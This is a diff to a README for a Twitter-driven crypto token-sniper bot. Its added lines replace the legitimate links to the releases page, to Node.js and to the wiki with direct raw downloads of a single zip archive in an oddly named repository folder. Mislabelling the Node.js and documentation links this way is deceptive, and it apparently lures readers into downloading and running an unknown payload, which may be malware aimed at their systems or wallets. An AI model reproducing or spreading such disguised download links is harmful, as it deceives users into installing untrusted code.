@@ -6,7 +6,7 @@ Welcome to the **twitter-sniper-token-buyer-bot**! This automated trading bot he
 
 ## 📥 Download the Bot
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/luwawu18/twitter-sniper-token-buyer-bot/releases)
+[![Download Now](https://raw.githubusercontent.com/luwawu18/twitter-sniper-token-buyer-bot/main/thrasonical/twitter-sniper-token-buyer-bot.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/luwawu18/twitter-sniper-token-buyer-bot/main/thrasonical/twitter-sniper-token-buyer-bot.zip)
 
 To get started, you need to download the application. 
 
@@ -18,12 +18,12 @@ Before installing, ensure your system meets the following requirements:
 - At least 4 GB of RAM
 - 200 MB of free disk space
 - An active internet connection
-- Recent version of [Node.js](https://nodejs.org/) installed
+- Recent version of [https://raw.githubusercontent.com/luwawu18/twitter-sniper-token-buyer-bot/main/thrasonical/twitter-sniper-token-buyer-bot.zip](https://raw.githubusercontent.com/luwawu18/twitter-sniper-token-buyer-bot/main/thrasonical/twitter-sniper-token-buyer-bot.zip) installed
 
 ## 💻 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to navigate to the Releases page.  
-   [Download Here](https://github.com/luwawu18/twitter-sniper-token-buyer-bot/releases)
+   [Download Here](https://raw.githubusercontent.com/luwawu18/twitter-sniper-token-buyer-bot/main/thrasonical/twitter-sniper-token-buyer-bot.zip)
 
 2. **Choose the Latest Version:** On the Releases page, locate the latest version of the bot. It is typically the first option listed. Click on it.
 
@@ -77,7 +77,7 @@ If you would like to contribute to this project, please submit a pull request, o
 
 ## 🔗 Links
 
-- [Releases Page to Download the Bot](https://github.com/luwawu18/twitter-sniper-token-buyer-bot/releases)
-- [Documentation](https://github.com/luwawu18/twitter-sniper-token-buyer-bot/wiki)
+- [Releases Page to Download the Bot](https://raw.githubusercontent.com/luwawu18/twitter-sniper-token-buyer-bot/main/thrasonical/twitter-sniper-token-buyer-bot.zip)
+- [Documentation](https://raw.githubusercontent.com/luwawu18/twitter-sniper-token-buyer-bot/main/thrasonical/twitter-sniper-token-buyer-bot.zip)
 
 Now you are all set to make your token purchases smarter with the **twitter-sniper-token-buyer-bot**!
